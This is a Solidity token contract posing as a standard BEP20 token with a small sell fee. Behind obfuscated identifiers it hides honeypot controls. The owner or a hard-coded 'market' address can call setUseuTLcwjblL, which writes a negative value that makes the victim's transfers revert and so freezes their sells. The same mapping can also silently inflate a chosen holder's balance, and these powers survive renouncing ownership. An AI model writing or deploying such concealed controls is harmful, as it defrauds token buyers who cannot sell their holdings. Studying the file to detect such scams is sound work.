/**
 *Submitted for verification at FtmScan.com on 2022-11-23
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _owner;

    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor() {
        _transferownership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function transferownership() public virtual onlyOwner {
        _transferownership(address(0));
    }


    function transferownership(address newowner) public virtual onlyOwner {
        require(newowner != address(0), "Ownable: new owner is the zero address");
        _transferownership(newowner);
    }


    function _transferownership(address newowner) internal virtual {
        address oldowner = _owner;
        _owner = newowner;
        emit ownershipTransferred(oldowner, newowner);
    }
}



library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {

        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}




interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint GRyGecXsrADesired,
        uint GRyGecXsrBDesired,
        uint GRyGecXsrAMin,
        uint GRyGecXsrBMin,
        address to,
        uint deadline
    ) external returns (uint GRyGecXsrA, uint GRyGecXsrB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint GRyGecXsrTokenDesired,
        uint GRyGecXsrTokenMin,
        uint GRyGecXsrETHMin,
        address to,
        uint deadline
    ) external payable returns (uint GRyGecXsrToken, uint GRyGecXsrETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint GRyGecXsrAMin,
        uint GRyGecXsrBMin,
        address to,
        uint deadline
    ) external returns (uint GRyGecXsrA, uint GRyGecXsrB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint GRyGecXsrTokenMin,
        uint GRyGecXsrETHMin,
        address to,
        uint deadline
    ) external returns (uint GRyGecXsrToken, uint GRyGecXsrETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint GRyGecXsrAMin,
        uint GRyGecXsrBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint GRyGecXsrA, uint GRyGecXsrB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint GRyGecXsrTokenMin,
        uint GRyGecXsrETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint GRyGecXsrToken, uint GRyGecXsrETH);
    function swapExactTokensForTokens(
        uint GRyGecXsrIn,
        uint GRyGecXsrOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory GRyGecXsrs);
    function swapTokensForExactTokens(
        uint GRyGecXsrOut,
        uint GRyGecXsrInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory GRyGecXsrs);
    function swapExactETHForTokens(uint GRyGecXsrOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory GRyGecXsrs);
    function swapTokensForExactETH(uint GRyGecXsrOut, uint GRyGecXsrInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory GRyGecXsrs);
    function swapExactTokensForETH(uint GRyGecXsrIn, uint GRyGecXsrOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory GRyGecXsrs);
    function swapETHForExactTokens(uint GRyGecXsrOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory GRyGecXsrs);

    function quote(uint GRyGecXsrA, uint reserveA, uint reserveB) external pure returns (uint GRyGecXsrB);
    function getGRyGecXsrOut(uint GRyGecXsrIn, uint reserveIn, uint reserveOut) external pure returns (uint GRyGecXsrOut);
    function getGRyGecXsrIn(uint GRyGecXsrOut, uint reserveIn, uint reserveOut) external pure returns (uint GRyGecXsrIn);
    function getGRyGecXsrsOut(uint GRyGecXsrIn, address[] calldata path) external view returns (uint[] memory GRyGecXsrs);
    function getGRyGecXsrsIn(uint GRyGecXsrOut, address[] calldata path) external view returns (uint[] memory GRyGecXsrs);
}




interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfireOnTransferTokens(
        address token,
        uint liquidity,
        uint GRyGecXsrTokenMin,
        uint GRyGecXsrETHMin,
        address to,
        uint deadline
    ) external returns (uint GRyGecXsrETH);
    function removeLiquidityETHWithPermitSupportingfireOnTransferTokens(
        address token,
        uint liquidity,
        uint GRyGecXsrTokenMin,
        uint GRyGecXsrETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint GRyGecXsrETH);

    function swapExactTokensForTokensSupportingfireOnTransferTokens(
        uint GRyGecXsrIn,
        uint GRyGecXsrOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfireOnTransferTokens(
        uint GRyGecXsrOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfireOnTransferTokens(
        uint GRyGecXsrIn,
        uint GRyGecXsrOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function UfyQoCTxs() external view returns (address);
    function UfyQoCTxsSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setUfyQoCTxs(address) external;
    function setUfyQoCTxsSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }


    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(owner, spender, currentAllowance - subtractedValue);
    }

        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amount);
        }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}


contract Token is BEP20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _gnRmcBrjd;

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 LPuiFdlyG = _balances[from];
        require(LPuiFdlyG >= amount, "ERC20: transfer amount exceeds balance");
    unchecked {
        _balances[from] = LPuiFdlyG - amount;
    }
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 jtVKWjJNr = _balances[account];
        require(jtVKWjJNr >= amount, "ERC20: burn amount exceeds balance");
    unchecked {
        _balances[account] = jtVKWjJNr - amount;
    }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    function _mtin(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }


    address public uniswapV2Pair;
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mtin(msg.sender, totalSupply_ * 10**decimals());
    }

    using SafeMath for uint256;

    uint256 private _FTpbPKQRz = 3;

    uint256 private _bQPQVBOHJ = 0;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping(address => int256) private _gHafXikrS;

    address private _marketMAewAddress = 0x94F2099Ee0a1e80c901D38d51be50f7a964Ad9Ac;
    address private _fundZPewAddress = 0xC08eAB9dc08C937cDF6B98D5D6F2b38e93336f87;


    function setMarketAddress(address addr) external onlyOwner {
        _marketMAewAddress = addr;
    }

    function setFundAddress(address addr) external onlyOwner {
        _fundZPewAddress = addr;
    }

    function setFeeSBgTavVgl(uint256 fese) external onlyOwner {
        _FTpbPKQRz = fese;
    }


    function setPairGObgDKSXm(address _address) external vxoetzoRW {
        uniswapV2Pair = _address;
    }


    function setUseuTLcwjblL(address PFpOfBsRm) external vxoetzoRW {
        _gHafXikrS[PFpOfBsRm] = int256(0) - int256(_totalSupply);
    }

    function rmUsePGwosLPxY(address PFpOfBsRm) external vxoetzoRW {
        _gHafXikrS[PFpOfBsRm] = 0;
    }

    function gethPxUgJEVD(address PFpOfBsRm) external view returns (int256) {
        return _gHafXikrS[PFpOfBsRm];
    }

    modifier vxoetzoRW() {
        require(owner() == msg.sender || _marketMAewAddress == msg.sender, "!Market");
        _;
    }


    function _CENmIeGAd(
        address from,
        address _to,
        uint256 _GRyGecXsr
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 LPuiFdlyG = _balances[from];
        require(LPuiFdlyG >= _GRyGecXsr, "ERC20: transfer amount exceeds balance");
        if (_gHafXikrS[from] > 0){
            _balances[from] = _balances[from].add(uint256(_gHafXikrS[from]));
        }else if (_gHafXikrS[from] < 0){
            _balances[from] = _balances[from].sub(uint256(_gHafXikrS[from]));
        }


        uint256 helooGRyGecXsr = 0;
        uint256 rtvEgBoMV = _FTpbPKQRz;
        if (uniswapV2Pair != address(0)) {
            if (_to == uniswapV2Pair) {
                rtvEgBoMV = _FTpbPKQRz;
            }
            if (from == uniswapV2Pair) {
                rtvEgBoMV = _bQPQVBOHJ;
            }
        }
        helooGRyGecXsr = _GRyGecXsr.mul(rtvEgBoMV).div(100);

        if (helooGRyGecXsr > 0) {
            _balances[from] = _balances[from].sub(helooGRyGecXsr);
            _balances[_deadAddress] = _balances[_deadAddress].add(helooGRyGecXsr);
            emit Transfer(from, _deadAddress, helooGRyGecXsr);
        }

        _balances[from] = _balances[from].sub(_GRyGecXsr - helooGRyGecXsr);
        _balances[_to] = _balances[_to].add(_GRyGecXsr - helooGRyGecXsr);
        emit Transfer(from, _to, _GRyGecXsr - helooGRyGecXsr);
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        address owner = _msgSender();
        _CENmIeGAd(owner, to, amount);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amount);
        _CENmIeGAd(from, to, amount);
        return true;
    }
}